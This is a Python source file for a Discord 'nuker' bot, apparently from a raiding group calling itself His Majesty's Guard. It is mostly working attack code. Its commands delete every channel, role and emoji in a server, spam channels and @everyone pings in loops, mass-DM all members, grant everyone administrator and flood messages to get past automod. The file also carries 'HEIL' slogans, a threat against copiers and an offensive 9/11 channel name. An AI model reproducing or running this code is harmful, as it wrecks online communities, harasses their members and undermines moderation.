# CODE MADE AND DEVELOPED BY JAK
# DON'T SKID OR I WILL FIND YOU
# HEIL HMG

# imports
import discord
import random
import os
import colorama
import asyncio
import pypresence
import sys
import requests as rq
import aiohttp
import json
import threading
try:
  import taskio
except:
  os.system('pip install taskio')

# from imports
from discord.ext import commands
from pypresence import Presence
from colorama import Fore as Col
from colorama import Style

# customization
prefix = '>'
channel = ['rizzed-by-jak', 'heil-hmg', 'ᝪᝬᝧᝩᝧᝪᝬᝤᝢ', 'nine-eleven-wasnt-funny', 'fail', 'fatality', 'w-rizz']
role = ["Heil Jak | Long Live His Majesty's Guard [ĦМ₲]"]
spam = ["""
```Nuked By His Majesty's Guard [ĦМ₲]```

__**HEIL THE GUARD**__
https://media.discordapp.net/attachments/1091794018301661355/1091794133120720966/Untitled296_20221128195950.png
https://discord.gg/rdXHweYQ7f
||@everyone||
"""]
dm = ["""
```Nuked By His Majesty's Guard [ĦМ₲]```

__**HEIL THE GUARD**__
https://media.discordapp.net/attachments/1091794018301661355/1091794133120720966/Untitled296_20221128195950.png
https://discord.gg/rdXHweYQ7f
"""]
EMOJI_URL = "https://media.discordapp.net/attachments/1091910189726322769/1092988683881300038/Untitled296_20221128195950.jpg"
EMOJI_NAME = "NUKED_BY_HMG"
servername = "ĦМ₲ OWNS YOU LMAO"
serverav = "https://media.discordapp.net/attachments/1092873583593787412/1092998870310588416/Untitled31_20230404222146_1.jpg"
nickall = "HEIL ĦМ₲"
helpcom = "Help"
token = input(f"{Col.YELLOW}token:")
jak = commands.Bot(
  command_prefix=prefix,
  intents=discord.Intents.all(),
  help_command=None,
  )

@jak.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name=servername)
    with open('avatar.png', 'wb') as avatar_file:
        avatar_file.write(rq.get(serverav).content)
    with open('avatar.png', 'rb') as avatar_file:
        avatar = avatar_file.read()
        await ctx.guild.edit(icon=avatar)
        try:
          for channels in ctx.guild.channels:
            await channels.delete()
            print(f'{channels.name} has been deleted')
        except Exception as e:
          print(f'Error occurred while deleting channels: {e}')
          while True:
            await ctx.guild.create_text_channel(random.choice(channel))

@jak.command()
async def fnuke(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name=servername)
  with open('avatar.png', 'wb') as avatar_file:
    avatar_file.write(rq.get(serverav).content)
    with open('avatar.png', 'rb') as avatar_file:
        avatar = avatar_file.read()
        await ctx.guild.edit(icon=avatar)
        try:
          for chan in ctx.guild.channels:
            await chan.delete()
            for x in range(100):
              await ctx.guild.create_text_channel("heil-hmg")
              for c in ctx.guild.text_channels:
                for i in range(5):
                  await c.send(random.choice(spam))
        except Exception as e:
          print(f'{e}')

@jak.command()
async def tnuke(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name=servername)
  with open('avatar.png', 'wb') as avatar_file:
    avatar_file.write(rq.get(serverav).content)
    with open('avatar.png', 'rb') as avatar_file:
        avatar = avatar_file.read()
        await ctx.guild.edit(icon=avatar)
        try:
          for chan in ctx.guild.channels:
            await chan.delete()
            for x in range(100):
              await ctx.guild.create_text_channel("heil-hmg")
              for c in ctx.guild.text_channels:
                for i in range(3):
                  await c.send(random.choice(spam))
        except Exception as e:
          print(f"{e}")

@jak.command()
async def onuke(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name=servername)
  with open('avatar.png', 'wb') as avatar_file:
    avatar_file.write(rq.get(serverav).content)
    with open('avatar.png', 'rb') as avatar_file:
        avatar = avatar_file.read()
        await ctx.guild.edit(icon=avatar)
        try:
          for chan in ctx.guild.channels:
            await chan.delete()
            for x in range(100):
              await ctx.guild.create_text_channel("heil-hmg")
              for c in ctx.guild.text_channels:
                for i in range(1):
                  await c.send(random.choice(spam))
        except Exception as e:
          print(f"{e}")

@jak.command()
async def lastcheck(ctx):
  await ctx.message.delete()
  for c in ctx.guild.text_channels:
    if c == 'heil-hmg':
      print(f"Last Check Successful")
    else:
      await c.delete()

@jak.command()
async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(
  colour = discord.Colour.blue()
)
  embed.set_author(name='HMG V3 Nuker')
  embed.add_field(name='help', value='shows this menu')
  embed.add_field(name='massdm', value='DMs everyone in a server')
  embed.add_field(name='raid', value='spam pings server via bot')
  embed.add_field(name='mch', value='spams channels')
  embed.add_field(name='cdel', value='deletes all channels')
  embed.add_field(name='nuke', value='nukes server')
  embed.add_field(name='rolespam', value='spams roles')
  embed.add_field(name='roledelete', value='deletes roles')
  embed.add_field(name='ebomb', value='deletes emojis')
  embed.add_field(name='eflood', value='spams emojis')
  embed.add_field(name='change', value='changes server icon and name')
  embed.add_field(name='mee6bypass', value='bypasses mee6 automod')
  embed.add_field(name='adminall', value='gives everyone admin')
  await ctx.send(embed=embed)



@jak.event
async def on_connect():
  print('Loading Commands')
  await asyncio.sleep(1)
  print('Commands Loaded')
  await asyncio.sleep(0.5)
  print(f"""{Col.RED}
░░░░░░███████]▄▄▄▄▄▄▄▄
▂▄▅█████████▅▄▃▂
I███████████████████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...

{Col.GREEN}{jak.user} Online !
{Col.GREEN}Prefix: {prefix}
{Col.GREEN}Token: {token}
{Col.GREEN}Role: {role}
{Col.GREEN}Spam: {spam}
{Col.GREEN}Help Command: {helpcom}

{Col.RED}
░░░░░░███████]▄▄▄▄▄▄▄▄
▂▄▅█████████▅▄▃▂
I███████████████████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...
""")

@jak.command()
async def massdm(ctx):
  for guild in jak.guilds:
    for member in guild.members:
      try:
        await member.send(random.choice(dm))
      except discord.Forbidden:
        print(f"{Col.RED}Failed to DM {member.name}: Missing Perms")
      except discord.HTTPException:
        print(f"{Col.RED}Failed to DM {member.name}: HTTP Network Error")
      except Exception as e:
        print(f"{Col.RED}Failed to DM {member.name}: {e}")

@jak.command()
async def raid(ctx, amount=100):
  await ctx.message.delete()
  if amount is None:
    for _ in range(amount):
      for channel in ctx.guild.text_channels:
        await channel.send(random.choice(spam))
  else:
    while True:
      for channel in ctx.guild.text_channels:
        await channel.send(random.choice(spam))
        print("Successfully Spam Pinged Server")

@jak.command()
async def mch(ctx):
  await ctx.message.delete()
  while True:
    guild = ctx.guild
    await guild.create_text_channel(random.choice(channel))

@jak.command()
async def cdel(ctx):
  await ctx.message.delete()
  r = rq.get('https://discord.com/api/v8/channel')
  rea = r.json()
  for channel in ctx.guild.channels:
    await channel.delete()
    print(f"{channel.name} has been deleted")

@jak.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for x in range(70):
    try:
      await ctx.guild.create_role(name=random.choice(role))
      print(f"{Col.GREEN}{x} Roles Created!")
    except:
        pass

@jak.command()
async def mee6bypass(ctx):
  await ctx.message.delete()
  spam = 369
  while spam < 50000:
    spam += 369
    await ctx.send(f"@everyone {spam}")

@jak.command()
async def eflood(ctx):
  try:
    session = aiohttp.ClientSession()
    for x in range(50):
      server = ctx.guild
      response = await session.get(EMOJI_URL)
      emoji_image = await response.content.read()
      emoji = await server.create_custom_emoji(name=EMOJI_NAME, image=emoji_image)
      print(f"{Col.GREEN}Created {emoji.name} {x} times")
  except discord.Forbidden:
    print(f"{Col.RED}Failed to create emojis: Missing Perms")

@jak.command()
async def ebomb(ctx):
  try:
    for e in list(ctx.guild.emojis):
      await e.delete()
      print(f"{Col.GREEN}Successfully deleted server emojis!")
  except discord.Forbidden:
    print(f"{Col.RED}failed to delete emojis: Missing Perms")

@jak.command()
async def roledelete(ctx):
  for roles in list(ctx.guild.roles):
    try:
      await roles.delete()
    except discord.Forbidden:
      print(f"{Col.RED} Failed to delete Roles: Missing Perms")

# @jak.command(pass_context=True) 
#async def rename(ctx, rename_to):
#  await ctx.message.delete()
#  for member in list(jak.get_all_members()):
#    try:
#      await member.edit(nick=rename_to)
#      print (f"{member.name} has been renamed to {rename_to}")
#    except discord.Forbidden:
#         print (f"{member.name} has NOT been renamed: Missing Perms")
 #   if rename_to == None:
#      for member in list(jak.get_all_members()):
#        try:
#          await member.edit(nick=nickall)
#          print (f"{member.name} has been renamed to {rename_to}")
#        except discord.Forbidden:
#          print (f"{member.name} has NOT been renamed: Missing Perms")

#@jak.command()
#async def timeoutall(ctx):
   # for member in ctx.guild.members:
     #   try:
     #     await ctx.guild.create_role(name="heil jak...", permissions=discord.Permissions(send_messages=False))
        #  await member.add_roles("heil jak...")
       #   await ctx.send('Everyone has been timed out.')
      #  except discord.Forbidden:
         #   print(f"{Col.RED}Failed to time-out {member.name}: Missing Perms")

@jak.command()
async def adminall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await ctx.guild.create_role(name="we luv hmg....", permissions=discord.Permissions(administrator=True))
      role = discord.utils.get(ctx.guild.roles, name="we luv hmg....")
      await member.add_roles(role)
    except discord.Forbidden:
      print(f"{Col.RED}Failed to give everyone admin: Missing Perms")

@jak.command()
async def change(ctx):
  await ctx.message.delete()
  try:
    await ctx.guild.edit(name=servername)
    with open('avatar.png', 'wb') as avatar_file:
        avatar_file.write(rq.get(serverav).content)
    with open('avatar.png', 'rb') as avatar_file:
        avatar = avatar_file.read()
        await ctx.guild.edit(icon=avatar)
  except discord.Forbidden:
    print(f"{Col.RED}Failed to edit server: Missing Perms")

jak.run(token)
